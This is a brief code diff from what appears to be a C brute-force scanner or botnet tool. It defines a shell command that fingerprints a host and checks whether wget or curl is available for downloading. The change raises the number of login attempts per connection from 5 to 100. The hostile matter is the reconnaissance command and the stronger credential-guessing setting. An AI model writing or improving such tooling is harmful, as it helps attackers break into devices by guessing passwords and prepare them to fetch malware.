@@ -32,7 +32,7 @@
 
 #define SYSINFO "uname -a 2>/dev/null|head -c100;echo;command -v wget>/dev/null&&echo W||{ command -v curl>/dev/null&&echo C||echo N;}"
 
-#define AUTH_PER_CONN 5
+#define AUTH_PER_CONN 100
 
 typedef struct {
     const char *u;
